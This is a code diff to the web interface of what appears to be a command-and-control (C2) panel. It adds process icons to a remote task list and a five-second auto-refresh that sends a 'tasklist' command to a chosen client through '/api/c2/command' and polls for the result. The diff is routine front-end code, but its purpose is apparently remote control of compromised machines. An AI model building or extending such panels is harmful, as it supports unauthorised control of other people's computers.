@@ -1681,10 +1681,11 @@ C:\&gt;</div>
             tasks.forEach(t => {
                 const safeName = escapeHtml(t.name);
                 const safeTitle = t.title ? escapeHtml(t.title) : '';
+                const iconHtml = t.icon ? `<img src="data:image/png;base64,${t.icon}" width="16" height="16" style="vertical-align:middle;margin-right:6px;image-rendering:pixelated;" draggable="false">` : '';
                 html += `<tr style="border-top:1px solid rgba(255,255,255,0.04);transition:background 0.12s;" onmouseover="this.style.background='rgba(255,255,255,0.02)'" onmouseout="this.style.background=''">
                     <td style="padding:8px 14px;font-family:var(--font-mono);font-size:12px;color:var(--text-muted);">${t.pid}</td>
                     <td style="padding:8px 14px;">
-                        <span style="font-weight:600;color:var(--text-primary);font-size:13px;">${safeName}</span>
+                        ${iconHtml}<span style="font-weight:600;color:var(--text-primary);font-size:13px;">${safeName}</span>
                         ${safeTitle ? `<span style="font-size:11px;color:var(--text-muted);margin-left:6px;">${safeTitle}</span>` : ''}
                     </td>
                     <td style="padding:8px 14px;font-family:var(--font-mono);font-size:12px;color:var(--text-secondary);">${t.mem} MB</td>
@@ -1757,6 +1758,53 @@ C:\&gt;</div>
                 } catch {}
             }, 'Kill');
         };
+
+        // Task Manager auto-refresh
+        let _taskmgrRefreshTimer = null;
+        function _taskmgrSilentRefresh() {
+            fetch('/api/c2/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ client_id: clientId, command: 'tasklist' })
+            }).then(() => {
+                let attempts = 0;
+                const poll = setInterval(async () => {
+                    attempts++;
+                    if (attempts > 20) { clearInterval(poll); return; }
+                    try {
+                        const r = await fetch('/api/c2/tasklist/' + encodeURIComponent(clientId));
+                        const data = await r.json();
+                        if (data && data.tasks) {
+                            clearInterval(poll);
+                            allTasks = data.tasks;
+                            const q = (document.getElementById('taskmgr-search').value || '').toLowerCase().trim();
+                            if (!q) renderTaskList(allTasks);
+                            else {
+                                const filtered = allTasks.filter(t =>
+                                    t.name.toLowerCase().includes(q) ||
+                                    String(t.pid).includes(q) ||
+                                    (t.title && t.title.toLowerCase().includes(q))
+                                );
+                                renderTaskList(filtered);
+                            }
+                        }
+                    } catch {}
+                }, 500);
+            }).catch(() => {});
+        }
+        document.querySelectorAll('.module-nav-item').forEach(btn => {
+            if (btn.dataset.module === 'task-manager') {
+                btn.addEventListener('click', () => {
+                    if (allTasks.length === 0) fetchTaskManagerList();
+                    if (_taskmgrRefreshTimer) clearInterval(_taskmgrRefreshTimer);
+                    _taskmgrRefreshTimer = setInterval(_taskmgrSilentRefresh, 5000);
+                });
+            } else {
+                btn.addEventListener('click', () => {
+                    if (_taskmgrRefreshTimer) { clearInterval(_taskmgrRefreshTimer); _taskmgrRefreshTimer = null; }
+                });
+            }
+        });
 
         // Mobile sidebar toggle
         (function() {
